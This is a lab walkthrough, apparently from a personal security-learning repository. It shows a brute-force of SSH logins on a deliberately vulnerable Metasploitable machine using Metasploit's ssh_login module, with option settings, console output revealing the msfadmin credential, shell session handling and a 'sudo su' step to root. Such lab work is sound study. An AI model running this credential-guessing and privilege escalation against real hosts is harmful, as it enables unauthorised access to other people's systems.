#  SSH - Brute Force Attack 
![image](https://user-images.githubusercontent.com/72777943/208243830-e15cadae-08c0-44df-b06c-fc40730a2b7e.png)

### Description
Brute force attacks is you sending a lot of different information to the target in order to figure out what information is correct.
For example this could be usernames or passwords. So we send a lot of usernames and a lot of passwords and hope that we by accident hit the correct one.
And when is this useful? Well, you usually perform this attack to see whether the target has default credentials or weak passwords.
These type of attacks will work for example, if the target has a password that has small amount of characters, or if it is very easy to guess.

### Starting the attack
I began by using Metasploit and searching for a scanner for SSH
$ `search ssh`

After going through the list I was able to find a `ssh_log` scanner.

$ `use auxiliary/scanner/ssh/ssh_login`

Running the **show options** command displayed alot of options to specify.
```
Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm
                                                )
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
                                                it
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
```

After setting my options, I ran show options again to ensure all details were correct.
```
   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                            no        A specific password to authenticate with
   PASS_FILE         /home/kali/Desktop/passwords.txt  no        File containing passwords, one per line
   RHOSTS            10.0.2.6                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22                                yes       The target port
   STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
   THREADS           1                                 yes       The number of concurrent threads (max one per host)
   USERNAME                                            no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                             no        Try the username as the password for all users
   USER_FILE         /home/kali/Desktop/usernames.txt  no        File containing usernames, one per line
   VERBOSE           true                              yes       Whether to print output for all attempts
 ```
 I set the **USERPASS_FILE** & **PASS_FILE** to the wordlists I created, I set **VERBOSE** to **true** as this will print out all attempts sent.
 
 Now this is all complete, I was able to then execute this exploit by running **exploit** which gave me the following output:  
 ```
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
[*] 10.0.2.6:22 - Starting bruteforce
[-] 10.0.2.6:22 - Failed: 'admin:password'
[!] No active DB -- Credential data will not be saved!
[-] 10.0.2.6:22 - Failed: 'admin:password123'
[-] 10.0.2.6:22 - Failed: 'admin:password'
[-] 10.0.2.6:22 - Failed: 'admin:s3cr3t_Pa55w0rd'
...
[+] 10.0.2.6:22 - Success: 'msfadmin:msfadmin'
[-] 10.0.2.6:22 - Failed: 'msfadmin:password123'
[-] 10.0.2.6:22 - Failed: 'msfadmin:password'
[-] 10.0.2.6:22 - Failed: 'msfadmin:s3cr3t_Pa55w0rd'
[+] 10.0.2.6:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 3 opened (10.0.2.5:36419 -> 10.0.2.6:22 ) at 2022-12-17 09:05:19 -0500
[-] 10.0.2.6:22 - Failed: 'admin:msfadmin'
[-] 10.0.2.6:22 - Failed: 'admin:super_secret_pass'
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > 
```
As shown above, it opened the command shell as soon as it found the correct username & password.
$ `[*] SSH session 1 opened (10.0.2.5:36419 -> 10.0.2.6:22 ) at 2022-12-17 09:05:19 -0500`

### I am not in shell though? 
As you can see I had to close the brute force attack with `ctrl + c`, this exited the command.
$ `msf6 auxiliary(scanner/ssh/ssh_login) >`

But luckily for us Metasploit saves the shell in the background so we can still access this shell.
To see all of the accessible shells, we can run the command `sessions`. 
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  3         shell linux  SSH root @   10.0.2.5:36419 -> 10.0.2.6:22  (10.0.2.6)
  ```

Here we can see our shell over SSH of the targets IP. 

### How to I access this shell? 
To access this shell, we can simply type

$ `sessions -i 3`  ( `-i` stands for interact ) 

As we can see this has opened our shell, so we can now execute the commands as usual.
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 3
[*] Starting interaction with 3...

whoami
msfadmin
```
### Become Root

$ `sudo su`

Then enter the credentials 

### Alternative login 

$ `ssh msfadmin@<ip>`
